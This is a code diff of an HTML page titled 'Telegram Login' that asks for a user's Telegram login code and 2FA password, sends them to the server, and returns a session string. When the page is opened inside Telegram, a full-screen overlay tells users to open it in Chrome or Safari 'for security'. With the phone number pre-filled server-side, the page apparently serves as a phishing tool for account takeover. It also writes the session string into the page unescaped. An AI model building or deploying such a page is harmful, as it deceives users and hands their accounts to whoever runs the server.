@@ -1,140 +1,108 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>String Session</title>
+  <meta charset="utf-8">
+  <title>Telegram Login</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body{font-family:Arial;max-width:480px;margin:2rem auto;background:#f4f6f9;padding:1rem;color:#333;}
-    .card{background:#fff;padding:1.8rem;border-radius:16px;margin:1rem 0;box-shadow:0 4px 20px rgba(0,0,0,0.08);}
-    h2{margin:0 0 0.5rem;font-size:1.5rem;color:#1a73e8;}
-    #code{font-size:2.8rem;font-weight:bold;text-align:center;letter-spacing:0.7rem;margin:1.8rem 0;color:#222;}
-    .keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:0.7rem;}
-    .keypad button{font-size:1.9rem;padding:1.2rem;border-radius:14px;background:#e8f0fe;border:none;color:#1a73e8;font-weight:bold;}
-    .keypad button:active{background:#d0e2ff;transform:scale(0.95);}
-    #msg{text-align:center;margin:1.2rem 0;font-weight:bold;min-height:1.5rem;}
-    .success{color:#0f9d58;}
-    .error{color:#d93025;}
-    input[type="password"]{width:100%;padding:0.9rem;margin:0.5rem 0;border:1px solid #ddd;border-radius:10px;font-size:1rem;}
-    button.submit{width:100%;padding:0.9rem;background:#1a73e8;color:white;border:none;border-radius:10px;font-weight:bold;font-size:1.1rem;margin-top:0.5rem;}
-    #result textarea{width:100%;height:130px;font-family:'Courier New',monospace;font-size:0.85rem;padding:0.8rem;border:1px solid #ddd;border-radius:10px;resize:none;background:#f8f9fa;margin:0.5rem 0;}
-    .copy{width:100%;padding:0.9rem;background:#0f9d58;color:white;border:none;border-radius:10px;font-weight:bold;font-size:1.1rem;}
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; background: #f0f2f5; }
+    .card { max-width: 400px; margin: 40px auto; background: white; padding: 24px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }
+    input, button { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
+    button { background: #229ED9; color: white; border: none; font-weight: bold; cursor: pointer; }
+    .info { background: #e3f2fd; padding: 12px; border-radius: 8px; margin: 16px 0; font-family: monospace; }
+    #pwdField { display: none; }
   </style>
 </head>
 <body>
 
   <div class="card">
-    <h2>Enter 5-Digit Code</h2>
-    <p>Check Telegram for login code.</p>
-    <div id="code">_____</div>
-    <div class="keypad">
-      <button onclick="add('1')">1</button><button onclick="add('2')">2</button><button onclick="add('3')">3</button>
-      <button onclick="add('4')">4</button><button onclick="add('5')">5</button><button onclick="add('6')">6</button>
-      <button onclick="add('7')">7</button><button onclick="add('8')">8</button><button onclick="add('9')">9</button>
-      <button onclick="add('0')">0</button><button onclick="back()">Backspace</button>
+    <h2>Telegram Login</h2>
+    <div class="info">Phone: {{ phone }}</div>
+    <button id="sendBtn">Send Code</button>
+    <input type="text" id="code" placeholder="Enter code" style="display:none;">
+    <div id="pwdField">
+      <input type="password" id="pwd" placeholder="2FA Password">
     </div>
-    <div id="msg"></div>
+    <button id="verifyBtn" style="display:none;">Verify</button>
+    <p id="status"></p>
   </div>
 
-  <div id="pwd" class="card" style="display:none;">
-    <h2>2FA Password</h2>
-    <input type="password" id="pass" placeholder="Enter 2FA password">
-    <button class="submit" onclick="verify()">Submit</button>
-  </div>
-
-  <div id="result" class="card" style="display:none;">
-    <h2>StringSession Ready!</h2>
-    <textarea id="session" readonly></textarea>
-    <button class="copy" onclick="copy()">Copy Full String</button>
-  </div>
-
+  <!-- OPEN IN BROWSER BANNER -->
   <script>
-    let code = '';
-    const phone = new URLSearchParams(location.search).get('phone');
-    const msg = document.getElementById('msg');
+    if (window.Telegram?.WebApp?.initData) {
+      const banner = document.createElement('div');
+      banner.style.cssText = `
+        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: #000000ee; color: white; z-index: 9999;
+        display: flex; flex-direction: column; justify-content: center;
+        align-items: center; text-align: center; padding: 20px;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      `;
+      banner.innerHTML = `
+        <h1 style="font-size: 24px; margin-bottom: 16px;">Open in Browser</h1>
+        <p style="max-width: 80%; margin-bottom: 32px; line-height: 1.5;">
+          For security, please open this page in <strong>Chrome</strong> or <strong>Safari</strong>.
+        </p>
+        <button onclick="openInBrowser()" style="
+          background: #229ED9; color: white; border: none; padding: 16px 36px;
+          font-size: 18px; font-weight: bold; border-radius: 12px; cursor: pointer;
+        ">Open in Browser</button>
+      `;
+      document.body.appendChild(banner);
+      document.body.style.overflow = 'hidden';
 
-    // AUTO SEND CODE ON PAGE LOAD
-    if (phone) {
-      msg.innerHTML = "Sending code...";
-      msg.className = "";
-      fetch('/send', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams({ phone })
-      })
-      .then(r => r.json())
-      .then(d => {
-        if (d.ok) {
-          msg.innerHTML = "Code sent! Check Telegram.";
-          msg.className = "success";
-        } else {
-          msg.innerHTML = d.error || "Failed to send code.";
-          msg.className = "error";
-        }
-      })
-      .catch(err => {
-        msg.innerHTML = "Network error: " + err.message;
-        msg.className = "error";
-      });
-    } else {
-      msg.innerHTML = "No phone number provided.";
-      msg.className = "error";
-    }
-
-    function add(d) {
-      if (code.length < 5) {
-        code += d;
-        document.getElementById('code').textContent = code.padEnd(5, '_');
-        if (code.length === 5) setTimeout(verify, 700);
+      function openInBrowser() {
+        window.location.href = window.location.href;
+        setTimeout(() => window.open(window.location.href, '_blank'), 600);
       }
-    }
+    } else {
+      // EXTERNAL BROWSER: RUN LOGIN LOGIC
+      const phone = "{{ phone }}";
+      const status = document.getElementById('status');
+      const sendBtn = document.getElementById('sendBtn');
+      const codeInput = document.getElementById('code');
+      const verifyBtn = document.getElementById('verifyBtn');
+      const pwdField = document.getElementById('pwdField');
+      const pwdInput = document.getElementById('pwd');
 
-    function back() {
-      code = code.slice(0, -1);
-      document.getElementById('code').textContent = code.padEnd(5, '_');
-    }
-
-    async function verify() {
-      const pwd = document.getElementById('pass')?.value || '';
-      const body = new URLSearchParams({ phone, code });
-      if (pwd) body.append('pwd', pwd);
-
-      msg.innerHTML = "Verifying...";
-      msg.className = "";
-
-      try {
-        const r = await fetch('/verify', {
+      sendBtn.onclick = async () => {
+        const res = await fetch('/send', {
           method: 'POST',
           headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body
+          body: `phone=${encodeURIComponent(phone)}`
         });
-        const d = await r.json();
-
-        if (d.needs_password) {
-          document.getElementById('pwd').style.display = 'block';
-          msg.innerHTML = "Enter 2FA password.";
-          msg.className = "error";
-        } else if (d.error) {
-          msg.innerHTML = d.error;
-          msg.className = "error";
-          code = '';
-          document.getElementById('code').textContent = '_____';
-        } else if (d.session) {
-          document.getElementById('session').value = d.session;
-          document.getElementById('result').style.display = 'block';
-          msg.innerHTML = "Success!";
-          msg.className = "success";
+        const data = await res.json();
+        if (data.ok) {
+          status.textContent = "Code sent! Check Telegram.";
+          sendBtn.style.display = 'none';
+          codeInput.style.display = 'block';
+          verifyBtn.style.display = 'block';
+        } else {
+          status.textContent = "Error: " + data.error;
         }
-      } catch (e) {
-        msg.innerHTML = "Connection failed.";
-        msg.className = "error";
-      }
-    }
+      };
 
-    function copy() {
-      const t = document.getElementById('session');
-      t.select();
-      navigator.clipboard.writeText(t.value).then(() => alert("Copied!"));
+      verifyBtn.onclick = async () => {
+        const code = codeInput.value;
+        const pwd = pwdInput.value;
+        const body = `phone=${encodeURIComponent(phone)}&code=${encodeURIComponent(code)}`;
+        const res = await fetch('/verify', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: pwd ? body + `&pwd=${encodeURIComponent(pwd)}` : body
+        });
+        const data = await res.json();
+        if (data.session) {
+          status.innerHTML = `<pre>${data.session}</pre><button onclick="navigator.clipboard.writeText('${data.session}')">Copy Session</button>`;
+        } else if (data.needs_password) {
+          pwdField.style.display = 'block';
+          status.textContent = "2FA enabled. Enter password.";
+        } else {
+          status.textContent = "Error: " + data.error;
+        }
+      };
     }
   </script>
+
 </body>
 </html>
